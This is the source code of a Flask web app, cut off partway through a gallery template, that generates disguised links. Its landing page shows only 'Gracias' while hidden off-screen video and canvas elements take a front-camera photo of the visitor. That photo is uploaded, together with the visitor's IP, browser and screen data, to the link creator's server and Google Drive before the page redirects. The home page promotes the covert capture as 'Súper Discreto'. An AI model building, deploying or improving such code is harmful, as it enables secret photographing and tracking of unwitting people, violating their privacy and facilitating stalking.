#!/usr/bin/env python3
"""
Sistema de Captura Discreta de Fotos antes de Redirección
Versión: 5.5 - Corrección definitiva de relaciones SQLAlchemy y ArgumentError
"""

from flask import Flask, request, render_template_string, jsonify, send_from_directory
from flask_sqlalchemy import SQLAlchemy
import os
import uuid
import json
import re
from datetime import datetime
from urllib.parse import unquote, quote
import logging

# Imports para Google Drive
try:
    from googleapiclient.discovery import build
    from google.oauth2.service_account import Credentials
    from googleapiclient.http import MediaIoBaseUpload
    import io
    GOOGLE_DRIVE_AVAILABLE = True
except ImportError:
    GOOGLE_DRIVE_AVAILABLE = False
    print("⚠️ Google Drive libraries not installed. Install with: pip install google-api-python-client google-auth")

# Configuración de logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

# --- Configuración de la Aplicación y Base de Datos ---
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'change_this_secret_key_in_production')

# Determinar si estamos en un entorno de desarrollo local (usando SQLite) o en producción
IS_LOCAL_DEV = os.environ.get('DATABASE_URL') is None

app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL', 'sqlite:///app_data.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False 

db = SQLAlchemy(app)

app.config['UPLOAD_FOLDER'] = 'captured_photos'
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)


# --- Modelos de Base de Datos ---
class DriveConfig(db.Model):
    id = db.Column(db.String(50), primary_key=True) 
    service_account_json = db.Column(db.JSON, nullable=False)
    folder_id = db.Column(db.String(255), nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

    def __repr__(self):
        return f"<DriveConfig {self.id}>"

class Link(db.Model):
    id = db.Column(db.String(8), primary_key=True)
    name = db.Column(db.String(255), nullable=False)
    destination_url = db.Column(db.String(2048), nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    clicks = db.Column(db.Integer, default=0)
    photos_captured = db.Column(db.Integer, default=0)
    last_clicked_at = db.Column(db.DateTime, nullable=True)
    
    drive_config_id = db.Column(db.String(50), db.ForeignKey('drive_config.id'), nullable=True)
    drive_config = db.relationship('DriveConfig', backref='links')
    
    # === MODIFICACIÓN CLAVE AQUÍ: Definir la relación de Link a Photo ===
    # 'photos' es el nombre del atributo en el objeto Link (ej. my_link.photos)
    # 'backref="link_obj"' crea un atributo 'link_obj' en cada objeto Photo, apuntando a su Link padre.
    # 'cascade="all, delete-orphan"' asegura que al borrar un Link, sus fotos también se borran de la DB.
    photos = db.relationship('Photo', backref='link_obj', lazy=True, cascade='all, delete-orphan') 

    def __repr__(self):
        return f"<Link {self.id}>"

class Photo(db.Model):
    id = db.Column(db.String(36), primary_key=True, default=lambda: str(uuid.uuid4())) 
    link_id = db.Column(db.String(8), db.ForeignKey('link.id'), nullable=False)
    
    # === MODIFICACIÓN CLAVE AQUÍ: Eliminar el 'backref' de la relación 'link' en Photo ===
    # La relación inversa (Link.photos) y el backref (Photo.link_obj)
    # ya están definidos en el modelo Link.
    # Esta definición de 'link' en Photo solo necesita especificar la relación a Link.
    link = db.relationship('Link') # <--- Cambiar de 'db.relationship('Link', backref='photos')' a 'db.relationship('Link')'
                                   # Esto es para evitar el conflicto del backref 'photos'.
                                   # photo.link ahora será el objeto Link padre.
                                   # Para acceder al Link padre, se puede usar photo.link o photo.link_obj (el backref).
                                   # Las plantillas usan photo.link.id, que seguirá funcionando.
    
    filename = db.Column(db.String(255), nullable=False)
    local_path = db.Column(db.String(255), nullable=True) 
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    ip_address = db.Column(db.String(45), nullable=True)
    user_agent = db.Column(db.Text, nullable=True)
    screen_resolution = db.Column(db.String(50), nullable=True)
    destination_url = db.Column(db.String(2048), nullable=True) 
    
    drive_config_id = db.Column(db.String(50), db.ForeignKey('drive_config.id'), nullable=True)
    drive_config_used = db.relationship('DriveConfig') 
    drive_info = db.Column(db.JSON, nullable=True) 

    def __repr__(self):
        return f"<Photo {self.id}>"


# ==================== GOOGLE DRIVE FUNCTIONS ====================

def get_drive_service(service_account_info_dict):
    """Obtener servicio de Google Drive usando info de la cuenta de servicio"""
    if not GOOGLE_DRIVE_AVAILABLE:
        logger.warning("Google Drive libraries not available.")
        return None
        
    try:
        credentials = Credentials.from_service_account_info(
            service_account_info_dict,
            scopes=['https://www.googleapis.com/auth/drive.file']
        )
        
        service = build('drive', 'v3', credentials=credentials)
        return service
    except Exception as e:
        logger.error(f"Error setting up Google Drive service with provided credentials: {e}", exc_info=True)
        return None

def upload_to_drive(file_data, filename, folder_id, service):
    """Subir archivo a Google Drive usando un servicio ya autenticado"""
    if not folder_id:
        logger.error("Google Drive folder ID not provided for upload.")
        raise ValueError("Google Drive folder ID is required for upload.")
    if not service:
        logger.error("Google Drive service not provided for upload.")
        raise ValueError("Google Drive service is required for upload.")

    try:
        file_metadata = {
            'name': filename,
            'parents': [folder_id]
        }
        
        media = MediaIoBaseUpload(
            io.BytesIO(file_data),
            mimetype='image/jpeg',
            resumable=True
        )
        
        file = service.files().create(
            body=file_metadata,
            media_body=media,
            fields='id,name,webViewLink'
        ).execute()
        
        logger.info(f"Foto '{file['name']}' subida a Drive: {file['webViewLink']}")
        
        return {
            'drive_id': file['id'],
            'name': file['name'],
            'view_link': file['webViewLink']
        }
        
    except Exception as e:
        logger.error(f"Error uploading '{filename}' to Google Drive: {e}", exc_info=True)
        raise e

# ==================== HTML TEMPLATES ====================

HOME_TEMPLATE = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📸 Generador de Links con Captura Discreta</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 40px 30px;
            text-align: center;
        }
        .header h1 { 
            font-size: 3rem; 
            margin-bottom: 15px;
        }
        .header p { 
            font-size: 1.3rem; 
            opacity: 0.95;
            line-height: 1.5;
        }
        .content { padding: 50px 40px; }
        
        .benefits {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .benefit-card {
            background: #f8f9fa;
            padding: 25px;
            border-radius: 12px;
            border-left: 4px solid #667eea;
            text-align: center;
        }
        .benefit-card .icon {
            font-size: 3rem;
            margin-bottom: 15px;
        }
        .benefit-card h3 {
            color: #333;
            margin-bottom: 10px;
            font-size: 1.2rem;
        }
        .benefit-card p {
            color: #666;
            font-size: 0.95rem;
            line-height: 1.4;
        }
        
        .form-section {
            background: #f8f9fa;
            padding: 40px;
            border-radius: 15px;
            margin: 30px 0;
        }
        .form-section h2 {
            color: #333;
            margin-bottom: 25px;
            font-size: 1.8rem;
            text-align: center;
        }
        .form-group { 
            margin-bottom: 25px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #333;
            font-size: 1.1rem;
        }
        input[type="url"], input[type="text"], textarea, select {
            width: 100%;
            padding: 15px;
            border: 2px solid #e1e5e9;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        input[type="url"]:focus, input[type="text"]:focus, textarea:focus, select:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        .input-hint {
            font-size: 0.9rem;
            color: #666;
            margin-top: 5px;
            font-style: italic;
        }
        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 18px 35px;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            width: 100%;
        }
        .btn:hover { 
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.3);
        }
        .result-section {
            margin-top: 30px;
            padding: 30px;
            background: #d4edda;
            border-radius: 12px;
            border-left: 4px solid #28a745;
            display: none;
        }
        .result-section.show { display: block; }
        .result-section h3 {
            color: #155724;
            margin-bottom: 15px;
            font-size: 1.5rem;
        }
        .generated-link {
            background: white;
            padding: 20px;
            border-radius: 8px;
            border: 1px solid #c3e6cb;
            word-break: break-all;
            font-family: 'Courier New', monospace;
            margin: 15px 0;
            font-size: 0.95rem;
        }
        .copy-btn {
            background: #28a745;
            color: white;
            padding: 12px 24px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 15px;
            margin-right: 10px;
            margin-bottom: 10px;
        }
        .copy-btn:hover { background: #218838; }
        .test-btn {
            background: #fd7e14;
            color: white;
            padding: 12px 24px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 15px;
            margin-bottom: 10px;
        }
        .test-btn:hover { background: #e96505; }
        
        .discrete-info {
            background: #fff3cd;
            color: #856404;
            padding: 25px;
            border-radius: 12px;
            margin: 30px 0;
            border-left: 4px solid #ffc107;
        }
        
        .nav-links {
            text-align: center;
            margin-top: 40px;
        }
        .nav-links a {
            display: inline-block;
            margin: 0 12px;
            padding: 12px 24px;
            background: #17a2b8;
            color: white;
            text-decoration: none;
            border-radius: 8px;
            font-size: 15px;
            transition: background 0.2s;
        }
        .nav-links a:hover { background: #138496; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📸 Generador de Links con Foto de Respaldo</h1>
            <p>Genera links que toman una foto discreta antes de redireccionar</p>
        </div>
        
        <div class="content">
            <div class="benefits">
                <div class="benefit-card">
                    <div class="icon">🎯</div>
                    <h3>Súper Discreto</h3>
                    <p>Solo aparece un mensaje breve. La foto se toma automáticamente en segundo plano.</p>
                </div>
                <div class="benefit-card">
                    <div class="icon">📱</div>
                    <h3>Cualquier Dispositivo</h3>
                    <p>Funciona en móvil, tablet y desktop. Se adapta automáticamente.</p>
                </div>
                <div class="benefit-card">
                    <div class="icon">☁️</div>
                    <h3>Google Drive</h3>
                    <p>Las fotos se guardan automáticamente en tu Google Drive personal.</p>
                </div>
            </div>
            
            <div class="discrete-info">
                <h3>📋 Captura Discreta:</h3>
                <p><strong>Lo que verá el usuario:</strong></p>
                <ul style="margin: 10px 0 10px 25px;">
                    <li>"Gracias"</li>
                    <li>Redirección automática en 2-3 segundos</li>
                    <li>Sin vista previa, sin botones, sin complicaciones</li>
                </ul>
                <p><strong>Lo que obtienes:</strong> Foto de alta calidad guardada en tu Google Drive con metadatos completos.</p>
            </div>
            
            <div class="form-section">
                <h2>🚀 Generar Link con Foto Discreta</h2>
                
                <form id="photoLinkForm">
                    <div class="form-group">
                        <label for="destinationUrl">🔗 URL de Destino:</label>
                        <input 
                            type="url" 
                            id="destinationUrl" 
                            name="destinationUrl" 
                            placeholder="https://tu-destino.com"
                            required
                        >
                        <div class="input-hint">Donde quieres enviar a los visitantes después de la foto</div>
                    </div>
                    
                    <div class="form-group">
                        <label for="linkName">📝 Nombre del Link (opcional):</label>
                        <input 
                            type="text" 
                            id="linkName" 
                            name="linkName" 
                            placeholder="Mi campaña especial"
                        >
                        <div class="input-hint">Para identificar este link en tu colección</div>
                    </div>

                    <div class="form-group">
                        <label for="driveConfig">☁️ Configuración de Google Drive:</label>
                        <select id="driveConfig" name="driveConfig">
                            <option value="">No subir a Google Drive</option>
                            {% for config in drive_configs %}
                                <option value="{{ config.id }}">{{ config.id }}</option>
                            {% endfor %}
                        </select>
                        <div class="input-hint">Selecciona una configuración de Drive guardada.</div>
                    </div>
                    
                    <button type="submit" class="btn">
                        📸 Generar Link con Captura Discreta
                    </button>
                </form>
            </div>
            
            <div id="resultSection" class="result-section">
                <h3>✅ ¡Tu Link con Captura Discreta está listo!</h3>
                <p>Comparte este link. Cuando alguien haga clic, se tomará una foto discreta y será redirigido:</p>
                
                <div id="generatedLink" class="generated-link"></div>
                
                <button onclick="copyToClipboard()" class="copy-btn">
                    📋 Copiar Link
                </button>
                
                <button onclick="testLink()" class="test-btn">
                    🧪 Probar Link
                </button>
                
                <div style="margin-top: 20px; padding: 15px; background: #f8f9fa; border-radius: 8px;">
                    <strong>💡 Cómo funciona:</strong>
                    <ul style="margin-top: 10px; margin-left: 20px;">
                        <li>El visitante ve un mensaje simple de "foto de respaldo"</li>
                        <li>La foto se toma automáticamente (sin vista previa)</li>
                        <li>Se guarda en tu Google Drive con timestamp</li>
                        <li>Redirección inmediata al destino</li>
                    </ul>
                </div>
            </div>
            
            <div class="nav-links">
                <a href="/gallery">📷 Ver Fotos</a>
                <a href="/admin">📊 Panel Admin</a>
                <a href="/config_drive">⚙️ Configurar Drive</a>
            </div>
        </div>
    </div>

    <script>
        let generatedLinkText = '';
        
        document.getElementById('photoLinkForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const destinationUrl = document.getElementById('destinationUrl').value;
            const linkName = document.getElementById('linkName').value;
            const driveConfig = document.getElementById('driveConfig').value; 

            if (!destinationUrl) {
                alert('Por favor, introduce una URL de destino');
                return;
            }
            
            try {
                const response = await fetch('/create_photo_link', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        destination_url: destinationUrl,
                        link_name: linkName || 'Link sin nombre',
                        drive_config_id: driveConfig 
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    generatedLinkText = data.photo_link;
                    document.getElementById('generatedLink').textContent = generatedLinkText;
                    document.getElementById('resultSection').classList.add('show');
                    document.getElementById('resultSection').scrollIntoView({ behavior: 'smooth' });
                } else {
                    alert('Error: ' + data.error);
                }
                
            } catch (error) {
                console.error('Error:', error);
                alert('Error generando el link. Verifica la conexión.');
            }
        });
        
        function copyToClipboard() {
            navigator.clipboard.writeText(generatedLinkText).then(function() {
                const btn = event.target;
                const originalText = btn.textContent;
                btn.textContent = '✅ ¡Copiado!';
                
                setTimeout(() => {
                    btn.textContent = originalText;
                }, 2000);
            }).catch(function(err) {
                alert('No se pudo copiar. Selecciona el texto manualmente.');
            });
        }
        
        function testLink() {
            if (generatedLinkText) {
                window.open(generatedLinkText, '_blank');
            }
        }
    </script>
</body>
</html>
"""

DISCRETE_CAPTURE_TEMPLATE = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Procesando...</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            margin: 0;
            padding: 0;
            background: #f8f9fa;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            color: #333;
        }
        .container {
            text-align: center;
            max-width: 400px;
            padding: 30px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .icon {
            font-size: 3rem;
            margin-bottom: 20px;
            color: #667eea;
        }
        h2 {
            color: #333;
            margin-bottom: 15px;
            font-size: 1.4rem;
            font-weight: 500;
        }
        
        /* CSS para ocultar el video y canvas de forma que sigan renderizando */
        #video, #canvas {
            width: 1px;
            height: 1px;
            position: fixed; 
            top: -100px;    
            left: -100px;
            opacity: 0.01;  
            pointer-events: none; 
            z-index: -9999;       
        }
        
        /* DESCOMENTA ESTO PARA DEPURAR SI LA FOTO SIGUE SALIENDO NEGRA
        // (y vuelve a COMENTAR para uso discreto) */
        /*
        #video, #canvas {
            position: static;
            width: 320px;
            height: 240px;
            opacity: 1;
            border: 2px solid red;
            margin: 20px;
            display: inline-block; 
            vertical-align: top;
        }
        .container {
            max-width: 800px; 
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 30px;
        }
        */
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">📸</div>
        <h2 id="mainMessage">Gracias</h2>
    </div>

    <!-- Elementos ocultos para captura -->
    <video id="video" autoplay muted playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const destinationUrl = decodeURIComponent('{{ destination_url }}');
        const linkId = '{{ link_id }}';
        const mainMessageDiv = document.getElementById('mainMessage');
        
        let stream = null;
        let captureCompleted = false;
        
        function setMainMessage(message) {
            mainMessageDiv.textContent = message;
        }

        function redirectToDestination() {
            setMainMessage('Redirigiendo...');
            setTimeout(() => {
                window.location.href = destinationUrl;
            }, 500);
        }

        async function performCaptureAndUpload() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');

            if (!video || !video.videoWidth || !video.videoHeight || video.readyState < 2) {
                console.error(`ERROR: Video no válido o no listo para captura. 
                               width: ${video.videoWidth}, 
                               height: ${video.videoHeight}, 
                               readyState: ${video.readyState}`);
                cleanup();
                redirectToDestination();
                return; 
            }

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height); 
            
            console.log('Imagen dibujada en el canvas. Dimensiones:', canvas.width, 'x', canvas.height, '. Procesando para subir...');
            
            canvas.toBlob(async function(blob) {
                if (blob && blob.size > 1000) { 
                    console.log('Blob size:', blob.size, 'bytes. Proceeding with upload.');
                    try {
                        await uploadPhoto(blob);
                        console.log('Foto subida con éxito.');
                    } catch (error) {
                        console.error('Error uploading:', error);
                    }
                } else {
                    console.error('Captured blob is too small or invalid (size:', blob ? blob.size : 'null', 'bytes). Skipping upload.');
                }
                cleanup(); 
                redirectToDestination(); 
            }, 'image/jpeg', 0.85); 
        }

        async function discreteCapture() {
            try {
                console.log('Iniciando proceso de acceso a cámara...');
                
                const constraints = {
                    video: {
                        facingMode: 'user', 
                        width: { ideal: 1280, min: 640 },
                        height: { ideal: 720, min: 480 },
                        frameRate: { ideal: 30, min: 15 }
                    },
                    audio: false
                };

                stream = await navigator.mediaDevices.getUserMedia(constraints);
                
                const video = document.getElementById('video');
                video.srcObject = stream;
                video.play(); 

                if ('requestVideoFrameCallback' in video) {
                    console.log('Usando requestVideoFrameCallback para una captura precisa.');
                    video.requestVideoFrameCallback(async () => {
                        if (!captureCompleted) {
                            captureCompleted = true;
                            try {
                                await performCaptureAndUpload();
                            } catch (e) {
                                console.error('Error en performCaptureAndUpload (requestVideoFrameCallback):', e);
                                cleanup();
                                redirectToDestination(); 
                            }
                        }
                    });
                } else {
                    console.log('requestVideoFrameCallback no disponible. Usando fallback con oncanplay.');
                    video.oncanplay = () => {
                        if (!captureCompleted) {
                            setTimeout(async () => {
                                if (!captureCompleted) { 
                                    captureCompleted = true;
                                    try {
                                        await performCaptureAndUpload();
                                    } catch (e) {
                                        console.error('Error en performCaptureAndUpload (oncanplay fallback):', e);
                                        cleanup();
                                        redirectToDestination();
                                    }
                                }
                            }, 500); 
                        }
                    };
                }
                
            } catch (error) {
                console.error('Error en discreteCapture (try-catch):', error);
                
                if (error.name === 'NotAllowedError') {
                    console.warn('Permisos de cámara denegados por el usuario.');
                } else if (error.name === 'NotFoundError') {
                    console.warn('Cámara no encontrada en el dispositivo.');
                } else if (error.name === 'NotReadableError') {
                    console.warn('Cámara en uso o inaccesible (NotReadableError).');
                } else {
                    console.error('Error desconocido al acceder a la cámara:', error);
                }
                
                cleanup();
                setTimeout(redirectToDestination, 2000); 
            }
        }
        
        async function uploadPhoto(blob) {
            const formData = new FormData();
            formData.append('photo', blob, `discrete_${Date.now()}.jpg`);
            formData.append('link_id', linkId);
            formData.append('timestamp', new Date().toISOString());
            formData.append('user_agent', navigator.userAgent);
            formData.append('screen_resolution', `${screen.width}x${screen.height}`);
            
            const response = await fetch('/save_discrete_photo', {
                method: 'POST',
                body: formData,
                headers: {
                    'X-Capture-Type': 'discrete',
                    'X-Destination': destinationUrl 
                }
            });
            
            if (!response.ok) {
                const errorText = await response.text();
                throw new Error(`Upload failed: ${response.status} - ${errorText}`);
            }
            
            const result = await response.json();
            return result;
        }
        
        function cleanup() {
            if (stream) {
                console.log('Deteniendo stream de cámara...');
                stream.getTracks().forEach(track => track.stop());
                stream = null;
            }
        }
        
        document.addEventListener('DOMContentLoaded', function() {
            setTimeout(() => {
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    discreteCapture();
                } else {
                    console.warn('Dispositivo no compatible con getUserMedia. Redirigiendo directamente.');
                    cleanup();
                    redirectToDestination();
                }
            }, 800); 
        });
        
        window.addEventListener('beforeunload', cleanup);
        
        setTimeout(() => {
            if (!captureCompleted) {
                console.log('Timeout absoluto alcanzado (8s), forzando redirección.');
                cleanup();
                redirectToDestination();
            }
        }, 8000); 
    </script>
</body>
</html>
"""

DRIVE_CONFIG_TEMPLATE = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚙️ Configurar Google Drive</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #a8c0ff 0%, #392b58 100%); 
            min-height: 100vh;
            padding: 20px;
            color: #333;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #a8c0ff 0%, #392b58 100%);
            color: white;
            padding: 40px 30px;
            text-align: center;
        }
        .header h1 { 
            font-size: 3rem; 
            margin-bottom: 15px;
        }
        .header p { 
            font-size: 1.3rem; 
            opacity: 0.95;
            line-height: 1.5;
        }
        .content { padding: 50px 40px; }
        
        .form-section {
            background: #f8f9fa;
            padding: 40px;
            border-radius: 15px;
            margin: 30px 0;
        }
        .form-section h2 {
            color: #333;
            margin-bottom: 25px;
            font-size: 1.8rem;
            text-align: center;
        }
        .form-group { 
            margin-bottom: 25px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #333;
            font-size: 1.1rem;
        }
        input[type="text"], textarea {
            width: 100%;
            padding: 15px;
            border: 2px solid #e1e5e9;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        input[type="text"]:focus, textarea:focus {
            outline: none;
            border-color: #a8c0ff;
            box-shadow: 0 0 0 3px rgba(168, 192, 255, 0.1);
        }
        textarea {
            min-height: 150px;
            resize: vertical;
            font-family: 'Courier New', monospace; 
        }
        .input-hint {
            font-size: 0.9rem;
            color: #666;
            margin-top: 5px;
            font-style: italic;
        }
        .btn {
            background: linear-gradient(135deg, #a8c0ff 0%, #392b58 100%);
            color: white;
            padding: 18px 35px;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            width: 100%;
        }
        .btn:hover { 
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(168, 192, 255, 0.3);
        }
        
        .config-list {
            margin-top: 30px;
            padding: 30px;
            background: #e8eaf6; 
            border-radius: 12px;
            border-left: 4px solid #7986cb; 
        }
        .config-list h3 {
            color: #3f51b5;
            margin-bottom: 20px;
            font-size: 1.5rem;
            text-align: center;
        }
        .config-item {
            background: white;
            padding: 20px;
            border-radius: 8px;
            border: 1px solid #c5cae9;
            margin-bottom: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .config-item p {
            margin: 0;
            color: #424242;
            font-size: 1rem;
        }
        .config-item button {
            background: #dc3545;
            color: white;
            padding: 8px 15px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 0.9rem;
            transition: background 0.2s;
        }
        .config-item button:hover {
            background: #c82333;
        }
        .no-configs {
            text-align: center;
            font-size: 1.2rem;
            color: #777;
            padding: 20px;
        }
        .nav-links {
            text-align: center;
            margin-top: 40px;
        }
        .nav-links a {
            display: inline-block;
            margin: 0 12px;
            padding: 12px 24px;
            background: #17a2b8;
            color: white;
            text-decoration: none;
            border-radius: 8px;
            font-size: 15px;
            transition: background 0.2s;
        }
        .nav-links a:hover { background: #138496; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⚙️ Configuración de Google Drive</h1>
            <p>Añade y gestiona las credenciales de tus cuentas de Google Drive para subir fotos.</p>
        </div>
        
        <div class="content">
            <div class="form-section">
                <h2>➕ Añadir Nueva Configuración de Drive</h2>
                
                <form id="driveConfigForm">
                    <div class="form-group">
                        <label for="configName">🏷️ Nombre de la Configuración:</label>
                        <input 
                            type="text" 
                            id="configName" 
                            name="config_name" 
                            placeholder="Mi Drive Personal"
                            required
                        >
                        <div class="input-hint">Un nombre único para identificar esta configuración (ej. "Drive de Juan", "Estudio Lab").</div>
                    </div>

                    <div class="form-group">
                        <label for="serviceAccountJson">🔑 JSON de Cuenta de Servicio:</label>
                        <textarea 
                            id="serviceAccountJson" 
                            name="service_account_json" 
                            placeholder='Pega aquí el contenido completo de tu archivo JSON de credenciales de Google Service Account (incluyendo las llaves {})...'
                            required
                        ></textarea>
                        <div class="input-hint">Asegúrate de que la cuenta de servicio tenga permisos de "Editor" en la carpeta de destino.</div>
                    </div>
                    
                    <div class="form-group">
                        <label for="folderId">📁 ID de Carpeta de Google Drive:</label>
                        <input 
                            type="text" 
                            id="folderId" 
                            name="folder_id" 
                            placeholder="Tu_ID_de_Carpeta_de_Google_Drive"
                            required
                        >
                        <div class="input-hint">Encuentra este ID en la URL de tu carpeta de Drive (después de `/folder/`).</div>
                    </div>
                    
                    <button type="submit" class="btn">
                        💾 Guardar Configuración de Drive
                    </button>
                </form>
            </div>

            <div class="config-list">
                <h3>Lista de Configuraciones Guardadas</h3>
                {% if drive_configs %}
                    {% for config in drive_configs %}
                        <div class="config-item">
                            <div>
                                <p><strong>Nombre:</strong> {{ config.id }}</p>
                                <p><strong>ID de Carpeta:</strong> {{ config.folder_id }}</p>
                                {% if config.service_account_json and config.service_account_json.client_email %}
                                    <p><small>Email de Servicio: {{ config.service_account_json.client_email }}</small></p>
                                {% else %}
                                    <p><small>Email de Servicio: N/A o JSON Inválido</small></p>
                                {% endif %}
                            </div>
                            <button onclick="deleteConfig('{{ config.id }}')">Eliminar</button>
                        </div>
                    {% endfor %}
                {% else %}
                    <p class="no-configs">No hay configuraciones de Drive guardadas.</p>
                {% endif %}
            </div>
            
            <div class="nav-links">
                <a href="/">🏠 Volver a Inicio</a>
            </div>
        </div>
    </div>

    <script>
        document.getElementById('driveConfigForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const configName = document.getElementById('configName').value.trim();
            const serviceAccountJson = document.getElementById('serviceAccountJson').value.trim();
            const folderId = document.getElementById('folderId').value.trim();
            
            if (!configName || !serviceAccountJson || !folderId) {
                alert('Por favor, completa todos los campos.');
                return;
            }

            try {
                // Intenta parsear el JSON antes de enviarlo
                let parsedServiceAccountJson;
                try {
                    parsedServiceAccountJson = JSON.parse(serviceAccountJson);
                } catch (jsonError) {
                    alert('El JSON de la Cuenta de Servicio no es válido. Por favor, revísalo.');
                    console.error('Error al parsear JSON:', jsonError);
                    return;
                }

                const response = await fetch('/save_drive_config', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        config_name: configName,
                        service_account_json: parsedServiceAccountJson, 
                        folder_id: folderId
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    alert('Configuración de Drive guardada con éxito.');
                    location.reload(); 
                } else {
                    alert('Error: ' + data.error);
                }
                
            } catch (error) {
                console.error('Error:', error);
                alert('Error al guardar la configuración. Verifica la conexión.');
            }
        });

        async function deleteConfig(configName) {
            if (!confirm(`¿Estás seguro de que quieres eliminar la configuración "${configName}"? Esto no eliminará archivos ya subidos.`)) {
                return;
            }
            try {
                const response = await fetch('/delete_drive_config/' + encodeURIComponent(configName), {
                    method: 'POST'
                });
                const data = await response.json();
                if (data.success) {
                    alert('Configuración eliminada.');
                    location.reload();
                } else {
                    alert('Error al eliminar: ' + data.error);
                }
            } catch (error) {
                console.error('Error:', error);
                alert('Error de red al intentar eliminar la configuración.');
            }
        }
    </script>
</body>
</html>
"""


GALLERY_TEMPLATE = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📷 Galería de Fotos Capturadas</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f0f2f5; margin: 0; padding: 20px; color: #333; }
        .container { max-width: 1200px; margin: 0 auto; background: white; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.08); padding: 40px; }
        h1 { text-align: center; color: #667eea; margin-bottom: 40px; font-size: 2.5rem; }
        .back-link { display: block; text-align: center; margin-bottom: 30px; text-decoration: none; color: #17a2b8; font-weight: 600; font-size: 1.1rem; }
        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 25px; }
        .photo-card { background: #fff; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.1); transition: transform 0.2s ease; }
        .photo-card:hover { transform: translateY(-5px); }
        .photo-card img { width: 100%; height: 200px; object-fit: cover; border-bottom: 1px solid #eee; }
        .photo-info { padding: 15px; }
        .photo-info h3 { margin-top: 0; margin-bottom: 10px; font-size: 1.2rem; color: #444; }
        .photo-info p { margin-bottom: 5px; font-size: 0.9rem; color: #666; }
        .photo-info a { color: #667eea; text-decoration: none; font-weight: 500; word-break: break-all; }
        .photo-info a:hover { text-decoration: underline; }
